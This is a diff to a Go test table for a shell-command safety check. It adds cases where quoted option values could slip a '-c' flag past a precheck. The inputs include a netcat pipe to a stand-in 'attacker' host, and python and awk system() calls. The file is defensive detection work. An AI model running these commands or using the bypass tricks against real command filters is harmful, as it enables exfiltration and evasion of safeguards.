@@ -55,6 +55,12 @@ func TestContainsDangerousShellChars(t *testing.T) {
 		{"python -W ignore -c", `python -W ignore -c 'import os; os.system("id")'`, true},
 		{"bash --rcfile /tmp/x -c", `bash --rcfile /tmp/x -c 'id | nc attacker 9000'`, true},
 		{"node --trace-deprecation --eval", `node --trace-deprecation --eval 'process.exit(0)'`, true},
+		// QUOTED separate-token values. Without matching inside single
+		// or double quotes the value would terminate early, break the
+		// option-skipping sequence, and let the subsequent `-c` slip
+		// past the precheck.
+		{"bash --rcfile single-quoted", `bash --rcfile '/tmp/x' -c 'id | nc attacker 9000'`, true},
+		{"python -W double-quoted", `python -W "ignore" -c 'import os; os.system("id")'`, true},
 
 		// --- awk / sed bypass -----------------------------------------
 		{"awk system()", `awk 'BEGIN{system("id")}'`, true},
